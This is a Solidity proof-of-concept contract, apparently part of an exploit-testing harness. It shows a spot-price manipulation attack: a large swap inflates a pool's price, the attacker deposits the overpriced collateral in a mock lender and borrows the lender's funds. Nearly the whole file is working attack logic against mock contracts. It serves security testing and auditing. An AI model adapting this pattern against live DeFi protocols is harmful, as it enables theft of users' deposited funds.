// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Lender} from "../src/Lender.sol";
import {MiniPool} from "../src/MiniPool.sol";
import {MockToken} from "../src/MockToken.sol";

/// @notice Spot-price manipulation: the lender values collateral at the pool's current price,
///         which a large purchase moves within the same transaction.
/// Knobs:
///   0 `pump`   quote tokens the attacker spends on base tokens, in whole tokens;
///   1 `swaps`  the number of equal swaps the purchase is split into.
/// The attacker starts with the quote tokens it spends (for example from a flash loan), buys
/// base tokens, deposits them as collateral at the inflated price and borrows as much as it can.
contract SpotPriceBorrowPoC is AssayPoC {
    MockToken internal collateral;
    MockToken internal stable;
    MiniPool internal pool;
    Lender internal lender;

    function setUpTarget() internal override {
        collateral = new MockToken();
        stable = new MockToken();
        pool = new MiniPool(collateral, stable);

        // A market maker opens the pool at a price of one quote token per base token.
        address maker = makeAddr("market_maker");
        collateral.mint(maker, 1_000 ether);
        stable.mint(maker, 1_000 ether);
        vm.startPrank(maker);
        collateral.approve(address(pool), type(uint256).max);
        stable.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000 ether, 1_000 ether);
        vm.stopPrank();

        // The lender opens with quote tokens to lend, and the market runs for a day.
        lender = new Lender(pool);
        stable.mint(address(lender), 5_000 ether);
        vm.warp(block.timestamp + 1 days);

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "pump", 2_000, 1, 3_000);
        declareKnob(1, "swaps", 1, 1, 40);
    }

    function exploit() internal override {
        uint256 spend = knob(0) * 1 ether;
        uint256 swaps = knob(1);
        stable.mint(attacker, spend);
        uint256 balanceBefore = stable.balanceOf(attacker);

        vm.startPrank(attacker);
        stable.approve(address(pool), type(uint256).max);
        uint256 chunk = spend / swaps;
        for (uint256 i = 0; i < swaps; i++) {
            pool.swap(false, chunk, 0);
        }
        uint256 bought = collateral.balanceOf(attacker);
        collateral.approve(address(lender), bought);
        lender.depositCollateral(bought);
        uint256 limit = lender.borrowLimit(attacker);
        uint256 available = stable.balanceOf(address(lender));
        lender.borrow(limit < available ? limit : available);
        vm.stopPrank();

        attacker_profit("quote", balanceBefore, stable.balanceOf(attacker));
    }
}
